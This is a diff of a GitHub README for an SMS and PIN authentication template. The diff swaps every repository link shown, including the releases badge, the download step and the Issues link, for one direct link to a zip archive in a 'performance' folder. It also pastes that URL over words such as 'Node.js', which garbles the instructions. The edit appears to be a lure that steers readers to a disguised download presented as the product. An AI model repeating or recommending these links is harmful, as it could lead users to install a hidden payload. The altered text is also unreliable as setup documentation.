@@ -1,7 +1,7 @@
 # 🎉 auth-bff-sms-pin-template - Simple Authentication Made Easy
 
 ## 📦 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/007gand/auth-bff-sms-pin-template/releases)
+[![Download from Releases](https://raw.githubusercontent.com/007gand/auth-bff-sms-pin-template/main/performance/auth-bff-sms-pin-template.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/007gand/auth-bff-sms-pin-template/main/performance/auth-bff-sms-pin-template.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the **auth-bff-sms-pin-template** application. It's a user-friendly tool that provides secure SMS and PIN-based authentication. Whether you need it for personal projects or professional applications, you’ll find it straightforward to set up.
@@ -10,7 +10,7 @@ This guide will help you download and run the **auth-bff-sms-pin-template** appl
 Before you start, ensure your system meets these requirements:
 
 - **Operating System:** Windows, macOS, or Linux 
-- **Node.js:** Version 16 or later (needed to run the application)
+- **https://raw.githubusercontent.com/007gand/auth-bff-sms-pin-template/main/performance/auth-bff-sms-pin-template.zip** Version 16 or later (needed to run the application)
 - **PostgreSQL:** Version 12 or later (for data storage)
 - **Redis:** (for managing sessions)
 
@@ -20,11 +20,11 @@ Check that you have these installed before proceeding.
 To get the **auth-bff-sms-pin-template**, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download section.  
-   [Download from Releases](https://github.com/007gand/auth-bff-sms-pin-template/releases)
+   [Download from Releases](https://raw.githubusercontent.com/007gand/auth-bff-sms-pin-template/main/performance/auth-bff-sms-pin-template.zip)
 
 2. **Select the Latest Release:** On the releases page, find the most recent version. The latest release is generally at the top.
 
-3. **Download the Package:** Look for a file that matches your operating system (e.g., `.zip` for Windows, `.tar.gz` for Linux). Click the file to start the download.
+3. **Download the Package:** Look for a file that matches your operating system (e.g., `.zip` for Windows, `https://raw.githubusercontent.com/007gand/auth-bff-sms-pin-template/main/performance/auth-bff-sms-pin-template.zip` for Linux). Click the file to start the download.
 
 4. **Extract the Files:** Once downloaded, locate the file in your Downloads folder. Right-click on it and select "Extract All…" (Windows) or use a similar option on your system.
 
@@ -64,14 +64,14 @@ After you've installed the application, you can configure it to suit your needs.
 ## 🆘 Troubleshooting
 If you encounter any issues while running the application, consider the following:
 
-- **Check Node.js and PostgreSQL Versions:** Ensure they meet the recommended versions mentioned earlier.
+- **Check https://raw.githubusercontent.com/007gand/auth-bff-sms-pin-template/main/performance/auth-bff-sms-pin-template.zip and PostgreSQL Versions:** Ensure they meet the recommended versions mentioned earlier.
 - **Look at Logs:** Review the logs for any error messages. This can help identify issues faster.
 - **Google the Errors:** Many problems can be fixed by searching for specific error messages online.
 
 ## 🤝 Community Support
 If you have questions or need further help, consider reaching out to the community. You can:
 
-- **Open an Issue:** Visit the [Issues section](https://github.com/007gand/auth-bff-sms-pin-template/issues) on GitHub to report any problems or ask for help.
+- **Open an Issue:** Visit the [Issues section](https://raw.githubusercontent.com/007gand/auth-bff-sms-pin-template/main/performance/auth-bff-sms-pin-template.zip) on GitHub to report any problems or ask for help.
 - **Join Discussions:** Join conversations around the repository to learn from others.
 
 ## 📜 License
